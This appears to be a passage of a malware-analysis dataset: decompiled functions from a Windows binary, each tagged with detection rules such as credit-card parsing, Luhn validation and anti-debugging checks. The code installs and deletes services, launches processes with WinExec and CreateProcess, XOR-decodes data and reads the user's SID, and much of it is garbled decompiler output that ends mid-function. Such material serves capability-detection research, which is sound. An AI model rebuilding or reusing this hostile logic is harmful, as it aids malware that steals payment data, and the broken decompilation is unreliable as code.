            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004037a4) overlaps instruction at (ram,0x004037a1)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x0040378f)\n// WARNING: Removing unreachable block (ram,0x004037a4)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004036d0(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uchar lpszPath;\n    uint var_25fh;\n    uchar lpCommandLine;\n    uint var_15bh;\n    uint var_58h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_14h;\n    uint hProcess;\n    uint var_ch;\n    uint lParam;\n    uint var_4h;\n    \n    fcn.00404be0();\n    iVar3 = fcn.00402eb0();\n    if (iVar3 != 0) {\n        lpszPath = 0;\n        puVar4 = &var_25fh;\n        for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n        *puVar4 = 0;\n        *(puVar4 + 2) = 0;\n        iVar3 = (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathA)(0, &lpszPath, 0x26, 0);\n        if (iVar3 != 0) {\n            fcn.00404eb0();\n            lpCommandLine = 0;\n            puVar4 = &var_15bh;\n            for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar4 = 0;\n                puVar4 = puVar4 + 1;\n            }\n            *puVar4 = 0;\n            *(puVar4 + 2) = 0;\n    // WARNING: Bad instruction - Truncating control flow here\n            (*_sym.imp.MSVCRT.dll_sprintf)(&lpCommandLine, 0x41152c, &lpszPath, 0x41150c, 3);\n            pcVar1 = _sym.imp.KERNEL32.dll_Sleep;\n            var_14h = 0;\n            do {\n                puVar4 = &var_58h;\n                for (iVar3 = 0x11; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar4 = 0;\n                    puVar4 = puVar4 + 1;\n                }\n                hProcess = 0;\n                var_58h = 0x44;\n                var_ch = 0;\n                var_2ch = 1;\n                lParam = 0;\n                var_28h._0_2_ = 0;\n                var_4h = 0;\n                iVar3 = (*_sym.imp.KERNEL32.dll_CreateProcessA)\n                                  (0, &lpCommandLine, 0, 0, 0, 0, 0, 0, &var_58h, &hProcess);\n                if (iVar3 == 0) {\n                    return;\n                }\n                (*pcVar1)(3000);\n                (*_sym.imp.USER32.dll_EnumWindows)(fcn.004035d0, lParam);\n                iVar3 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(hProcess, 1000);\n                if (iVar3 == 0x102) {\n                    (*_sym.imp.KERNEL32.dll_TerminateProcess)(hProcess, 1);\n                }\n                pcVar2 = _sym.imp.KERNEL32.dll_CloseHandle;\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(var_ch);\n                (*pcVar2)(hProcess);\n                var_14h = var_14h + 1;\n            } while (var_14h < 1);\n        }\n    }\n    return;\n}\n",
        "token_count": 896
    },
    "004038e0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004038e0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    if (0 < arg_14h) {\n        do {\n            *(iVar1 + arg_10h) = arg_14h ^ *(iVar1 + arg_10h) ^ *(iVar1 % arg_ch + arg_8h);\n            iVar1 = iVar1 + 1;\n        } while (iVar1 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 137
    },
    "00402020": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402020(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)(arg_8h, arg_ch, arg_ch, 0xf01ff, 1, 0, 1, arg_10h, 0, 0, 0, 0, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return 1;\n}\n",
        "token_count": 138
    },
    "00402910": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402910(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00402710(&var_68h, &var_4h);\n    fcn.00403f50(&var_68h, var_4h, 0x411614, 0x12000);\n    *arg_8h = 0x411614;\n    *arg_ch = 0x12000;\n    return;\n}\n",
        "token_count": 238
    },
    "00402cf0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402cf0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_31ch;\n    uint lpBuffer;\n    uint var_114h;\n    uint var_10h;\n    uint pcbBuffer;\n    uint var_8h;\n    uint var_4h;\n    \n    pcbBuffer = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(&lpBuffer, &pcbBuffer);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    var_4h = 0x104;\n    var_8h = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)(0, &lpBuffer, &var_114h, &var_4h, &var_31ch, &var_8h, &var_10h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)(&var_114h, arg_8h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 271
    },
    "00403bb0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00403bb0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    lpBuffer = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    var_8h = 0;\n    *(puVar3 + 2) = 0;\n    fcn.00404eb0();\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(*0x10 + -0x110, 4);\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.00401960();\n        arg_ch_01 = fcn.00401960();\n        arg_ch_02 = fcn.00401960();\n        fcn.00403b60(arg_10h, arg_ch_00);\n        fcn.00403b60(arg_8h, arg_ch_01);\n        fcn.00403b60(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x4111a4, &lpBuffer, arg_10h);\n        iVar2 = fcn.00401000(&var_314h);\n        if (iVar2 != 0) {\n            (*pcVar1)(&var_210h, 0x4111b0, &lpBuffer, arg_8h);\n            iVar2 = fcn.00401000(&var_210h);\n            if (iVar2 != 0) {\n                (*pcVar1)(&var_210h, 0x4111b0, &lpBuffer, arg_ch);\n                iVar2 = fcn.00401000(&var_210h);\n                if (iVar2 != 0) {\n                    iVar2 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar2 = var_8h;\n    } while (var_4h < 3);\n    fcn.00403b60(arg_14h, 4);\n    return iVar2 != 0;\n}\n",
        "token_count": 620
    },
    "00403fc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00403fc0(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.00403eb0;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x411610;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 218
    },
    "null": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl main(uint argv)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    uint lpMsg;\n    \n    iVar4 = fcn.00403fc0(argv);\n    if ((iVar4 != 0) && (iVar5 = fcn.004026b0(argv),  pcVar3 = _sym.imp.USER32.dll_GetMessageA,  iVar5 != 0)) {\n        iVar5 = (*_sym.imp.USER32.dll_GetMessageA)(&lpMsg, 0, 0, 0);\n        pcVar2 = _sym.imp.USER32.dll_TranslateMessage;\n        pcVar1 = _sym.imp.USER32.dll_GetDesktopWindow;\n        while (iVar5 != 0) {\n            (*pcVar2)(&lpMsg);\n            (*pcVar1)();\n            (*_sym.imp.USER32.dll_DispatchMessageA)(&lpMsg);\n            iVar5 = (*pcVar3)(&lpMsg, 0, 0, 0);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 242
    },
    "004013c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004013c0(uint arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint uVar3;\n    bool in_CF;\n    bool in_ZF;\n    bool in_OF;\n    uint var_4h;\n    \n    if (!in_CF && !in_ZF) {\n        if (in_CF || in_ZF) {\n            if (!in_OF) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            pcVar1 = swi(3);\n            uVar2 = (*pcVar1)();\n            return uVar2;\n        }\n    }\n    uVar2 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)();\n    uVar3 = fcn.004019c0(uVar2, arg_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(uVar2);\n    return uVar3;\n}\n",
        "token_count": 232
    },
    "00401430": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401485) overlaps instruction at (ram,0x00401481)\n// \n// WARNING: Removing unreachable block (ram,0x00401485)\n\nuint __fastcall fcn.00401430(uint32_t param_1, char param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    uint8_t *puVar1;\n    char *pcVar2;\n    uint32_t in_EAX;\n    int32_t iVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint16_t in_ES;\n    uint16_t in_SS;\n    bool in_ZF;\n    uint32_t in_stack_ffffffe0;\n    int32_t *piVar7;\n    uint32_t uVar8;\n    \n    if ((in_ZF) || (uVar5 = (param_1 >> 8 & 0xffff00) << 8 | param_1 & 0xffff,  !in_ZF)) {\n        in_EAX = param_4;\n        uVar5 = param_3;\n    }\n    piVar7 = in_stack_ffffffe0 & 0xffff0000 | in_SS;\n    uVar8 = 0x47;\n    puVar1 = (in_EAX | 0x8b) - 1;\n    *puVar1 = *puVar1 | uVar5 >> 8;\n    *piVar7 = *piVar7 + uVar5;\n    pcVar2 = (in_EAX | 0x8b) + 0x51;\n    *pcVar2 = *pcVar2 + param_2;\n    iVar3 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(0x47);\n    if (iVar3 != 0) {\n        iVar6 = iVar3;\n        if ((-1 < iVar3) && (-1 >= iVar3)) {\n            uVar8 = uVar8 & 0xffff0000 | in_ES;\n            iVar6 = iVar3 + -1;\n            *(piVar7 | &stack0xfffffffb) = iVar3;\n        }\n        uVar4 = (*_sym.imp.ADVAPI32.dll_DeleteService)(iVar6, uVar8);\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar6);\n        return uVar4;\n    }\n    return 0;\n}\n",
        "token_count": 523
    },
    "00401960": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040196b) overlaps instruction at (ram,0x00401969)\n// \n\nint32_t __fastcall fcn.00401960(int32_t param_1)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    char unaff_BL;\n    char in_SF;\n    char in_OF;\n    \n    if (in_OF == in_SF) {\n        if (in_OF != in_SF) {\n            *(param_1 + 0x5b9) = *(param_1 + 0x5b9) + unaff_BL;\n            goto code_r0x00401979;\n        }\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    in_EAX = iVar1 % 5;\ncode_r0x00401979:\n    return in_EAX + 3;\n}\n",
        "token_count": 190
    },
    "00401a70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401b1f) overlaps instruction at (ram,0x00401b1c)\n// \n// WARNING: Removing unreachable block (ram,0x00401ab4)\n// WARNING: Removing unreachable block (ram,0x00401b61)\n// WARNING: Removing unreachable block (ram,0x00401b6e)\n// WARNING: Removing unreachable block (ram,0x00401b1f)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401a70(uint arg_8h)\n\n{\n    uint8_t extraout_CH;\n    int32_t iVar1;\n    uint *puVar2;\n    bool bVar3;\n    bool bVar4;\n    ulong uVar5;\n    uchar lpBuffer;\n    uint var_20fh;\n    uchar s;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    lpBuffer = 0;\n    puVar2 = &var_20fh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    s = 0;\n    puVar2 = &var_10bh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x4111a4, &lpBuffer, arg_8h);\n    uVar5 = fcn.00402910(&var_4h, &var_8h);\n    bVar3 = false;\n    bVar4 = ((uVar5 >> 0x20 & 0xffffff00 | extraout_CH) & uVar5) == 0;\n    fcn.00401b90(var_4h);\n    if ((!bVar3 && !bVar4) && (bVar3 || bVar4)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    iVar1 = fcn.00404fd0(&s, var_4h, var_8h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    fcn.00401130(&s, 0xffffffff);\n    return 1;\n}\n",
        "token_count": 636
    },
    "00401d50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401daa) overlaps instruction at (ram,0x00401da6)\n// \n// WARNING: Removing unreachable block (ram,0x00401d9d)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl fcn.00401d50(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint extraout_ECX;\n    uchar uVar2;\n    uint *puVar3;\n    uint var_213h;\n    uchar s;\n    uint var_10fh;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar3 = &var_213h;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    s = 0;\n    puVar3 = &var_10fh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    var_ch = 1;\n    *(puVar3 + 2) = 0;\n    // WARNING: Bad instruction - Truncating control flow here\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0xb0, 0xe8, arg_8h);\n    fcn.004014a0(&var_4h, &var_8h);\n    iVar1 = fcn.00402b30(arg_8h, arg_ch, arg_10h, arg_14h, var_4h, var_8h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    if ((0 < iVar1) && (iVar1 < 1)) {\n        var_8h = extraout_ECX;\n    }\n    iVar1 = fcn.00404fd0(&s, var_4h, var_8h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    fcn.00403e00();\n    iVar1 = fcn.00402140(0x4111e8);\n    if (iVar1 == -1) {\n        iVar1 = fcn.00402140(0x4111dc);\n        if (iVar1 == -1) goto code_r0x00401f23;\n        uVar2 = 0xf;\n    }\n    else {\n        uVar2 = 0xe;\n    }\n    iVar1 = fcn.00402100(arg_8h);\n    if (iVar1 != 0) {\n        fcn.004023e0(uVar2);\n        fcn.004022f0(uVar2);\n        return 1;\n    }\n    if (*0x423664 == 0) {\n        return 0;\n    }\ncode_r0x00401f23:\n    iVar1 = fcn.00402620(arg_8h, &s);\n    if (iVar1 == 0) {\n        var_ch = 0;\n    }\n    if ((var_ch != 0) && (iVar1 = fcn.004013c0(arg_8h),  iVar1 == 0)) {\n        var_ch = 0;\n    }\n    if (var_ch == 0) {\n        var_ch = fcn.004017d0(arg_8h, 0);\n    }\n    iVar1 = var_ch;\n    if (var_ch != 0) {\n        fcn.004022f0(0xff);\n    }\n    (*_sym.imp.KERNEL32.dll_Sleep)(0xe8);\n    (*_sym.imp.KERNEL32.dll_WinExec)(0xfc, 0);\n    return iVar1;\n}\n",
        "token_count": 925
    },
    "00402100": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00402100(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004017d0(arg_8h, 1);\n    return iVar1 != 0;\n}\n",
        "token_count": 53
    },
    "00402220": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00402220(void)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint *puVar5;\n    uint *unaff_EBP;\n    bool bVar6;\n    \n    uVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    bVar6 = (POPCOUNT(uVar3 & 0xff) & 1U) != 0;\n    if (uVar3 == 0) {\n        return 0;\n    }\n    if ((bVar6) && (!bVar6)) {\n        puVar5 = &stack0xffffffec;\n        cVar1 = '\\x1e';\n        do {\n            unaff_EBP = unaff_EBP + -1;\n            puVar5 = puVar5 + -1;\n            *puVar5 = *unaff_EBP;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n        uVar4 = in(0x78);\n        return uVar4;\n    }\n    *0x423638 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    *0x42363c = (*pcVar2)(uVar3, 0x4112b0);\n    *0x423640 = (*pcVar2)(uVar3, 0x4112c0);\n    if ((*0x423638 != 0) && ((*0x42363c != 0 && (*0x423640 != 0)))) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 370
    },
    "00402300": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00402300(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint hKey;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(arg_8h, arg_ch, 0, 0xf003f, &hKey);\n    if (iVar1 != 0) {\n        return false;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, arg_10h, 0, arg_14h, arg_18h, arg_1ch);\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n    return iVar1 == 0;\n}\n",
        "token_count": 185
    },
    "00402620": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040268c) overlaps instruction at (ram,0x00402688)\n// \n\nuint __cdecl fcn.00402620(uint8_t *arg_8h, int32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint16_t uVar4;\n    int32_t in_ECX;\n    int32_t iVar5;\n    int32_t *piVar6;\n    uint unaff_EBX;\n    uint8_t *unaff_EDI;\n    bool bVar7;\n    uint8_t in_AF;\n    char cVar8;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    char cVar9;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    unkbyte10 extraout_ST0;\n    ulong uVar10;\n    \n    iVar5 = in_ECX - in_EAX;\n    uVar4 = iVar5 & 0xff00 | iVar5 ^ iVar5 >> 8 | 0x3d00 | unaff_EBX;\n    bVar7 = uVar4 >> 8 < uVar4;\n    iVar5 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    if (!bVar7) {\n        if (bVar7) goto code_r0x0040265d;\n    }\n    unaff_EDI = arg_8h;\ncode_r0x0040265d:\n    uVar1 = iVar5;\n    cVar8 = uVar1 - *unaff_EDI;\n    func_0x101885df((in_NT & 1) * 0x4000 | SBORROW1(uVar1, *unaff_EDI) * 0x800 | (in_IF & 1) * 0x200 |\n                    (in_TF & 1) * 0x100 | (cVar8 < '\\0') * 0x80 | (cVar8 == '\\0') * 0x40 | (in_AF & 1) * 0x10 |\n                    ((POPCOUNT(cVar8) & 1U) == 0) * 4 | uVar1 < *unaff_EDI | (in_ID & 1) * 0x200000 |\n                    (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000);\n    cVar9 = '\\0';\n    cVar8 = '\\0';\n    uVar10 = fcn.00401430();\n    piVar6 = uVar10 >> 0x20;\n    if ((cVar9 != cVar8) || (iVar2 = uVar10,  cVar9 == cVar8)) {\n        iVar2 = arg_ch;\n    }\n    *(iVar2 + -0x7ce92414) = extraout_ST0;\n    *piVar6 = *piVar6 + 0x458bdf84;\n    uVar3 = fcn.00402020(iVar5 + -1, unaff_EDI + 1, unaff_EBX);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar5 + -1);\n    return uVar3;\n}\n",
        "token_count": 766
    },
    "00402de0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.00402de0(char *arg_8h, int32_t arg_ch, char *arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    char *pcVar3;\n    char *pcVar4;\n    bool bVar5;\n    \n    pcVar2 = arg_8h + (arg_ch - arg_14h);\n    if (arg_14h == 0) {\n        return arg_8h;\n    }\n    if (arg_8h <= pcVar2) {\n        do {\n            if (*arg_8h == *arg_10h) {\n                iVar1 = arg_14h + -1;\n                bVar5 = true;\n                pcVar3 = arg_8h;\n                pcVar4 = arg_10h;\n                do {\n                    pcVar4 = pcVar4 + 1;\n                    pcVar3 = pcVar3 + 1;\n                    if (iVar1 == 0) break;\n                    iVar1 = iVar1 + -1;\n                    bVar5 = *pcVar3 == *pcVar4;\n                } while (bVar5);\n                if (bVar5) {\n                    return arg_8h;\n                }\n            }\n            arg_8h = arg_8h + 1;\n        } while (arg_8h <= pcVar2);\n    }\n    return NULL;\n}\n",
        "token_count": 310
    },
    "00402e80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00402e80(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_wcslen)(param_1);\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, iVar1 + 1, param_2, param_3, 0, 0);\n    return;\n}\n",
        "token_count": 103
    },
    "00403080": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00403080(int32_t *hWnd)\n\n{\n    uchar uVar1;\n    uchar *puVar2;\n    uint uVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uchar *puVar8;\n    uint *puVar9;\n    uint16_t in_ES;\n    uint *in_FS_OFFSET;\n    char cVar10;\n    char cVar11;\n    int32_t *piVar12;\n    uint var_24ch;\n    uchar var_148h;\n    uint var_147h;\n    uchar *var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t pbstr;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    uint lpdwResult;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4052b0;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    (*_sym.imp.ole32.dll_CoInitialize)(0);\n    puVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x411578);\n    cVar11 = '\\0';\n    cVar10 = puVar2 < 0;\n    if (puVar2 == NULL) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_44h = puVar2;\n    uVar3 = (*_sym.imp.USER32.dll_RegisterWindowMessageA)(0x411584);\n    piVar12 = hWnd;\n    uVar1 = (*_sym.imp.USER32.dll_SendMessageTimeoutA)(hWnd, uVar3, 0, 0, 2, 1000, &lpdwResult);\n    if ((cVar11 == cVar10) && (cVar11 != cVar10)) {\n        piVar12 = piVar12 & 0xffff0000 | in_ES;\n        puVar8 = puVar2 | &stack0xfffffffc;\n        puVar2 = puVar8 + 1;\n        *puVar8 = uVar1;\n    }\n    pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(puVar2, piVar12);\n    if (pcVar4 == NULL) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_20h = NULL;\n    var_4h = 0;\n    iVar5 = (*pcVar4)(lpdwResult, str._D_3, 0, &var_20h);\n    if ((iVar5 < 0) || (var_20h == NULL)) {\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    else {\n        var_24h = NULL;\n        var_4h._0_1_ = 1;\n        iVar5 = (**(*var_20h + 0x20))(var_20h, &var_24h);\n        if ((iVar5 < 0) || (var_24h == NULL)) {\n            var_4h = var_4h._1_3_ << 8;\n            if (var_24h != NULL) {\n                (**(*var_24h + 8))(var_24h);\n            }\n            var_4h = 0xffffffff;\n            if (var_20h != NULL) {\n                (**(*var_20h + 8))(var_20h);\n            }\n        }\n        else {\n            var_1ch = 0;\n            (**(*var_24h + 0x24))(var_24h, &var_1ch);\n            var_40h = 0;\n            if (0 < var_1ch) {\n                do {\n                    var_2ch = (*_sym.imp.MSVCRT.dll_rand)();\n                    var_2ch = var_2ch % var_1ch;\n                    var_34h = CONCAT22(var_34h._2_2_, 3);\n                    hWnd = NULL;\n                    var_10h = NULL;\n                    var_4h._0_1_ = 4;\n                    iVar5 = (**(*var_24h + 0x2c))\n                                      (var_24h, var_34h, var_30h, var_2ch, var_28h, var_34h, var_30h, var_2ch, var_28h, \n                                       